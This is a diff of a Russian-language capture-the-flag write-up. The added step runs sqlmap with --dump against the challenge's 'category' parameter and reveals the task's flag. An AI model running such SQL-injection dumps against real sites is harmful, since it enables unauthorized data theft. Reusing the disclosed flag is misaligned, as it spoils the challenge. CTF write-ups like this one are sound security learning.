@@ -18,3 +18,9 @@
 После этого сделал такой запрос: `sqlmap -u "http://task.duckerz.ru:21010/?category=Rare" --batch -D SQLite --columns`. Вот что получилось:
 
 ![Решения](images/Screenshot_2026-10-06_22_00_10.png)
+
+Далее таким запросом мне удалось найти флаг `DUCKERZ{Plush_P3P3_w0nt_l3t_g0_of_h1s_H34RT}` для этой задачи: `sqlmap -u "http://task.duckerz.ru:21010/?category=Rare" --batch -D SQLite --columns --dump`
+
+![Решения](images/Screenshot_2026-10-06_22_07_30.png)
+
+---
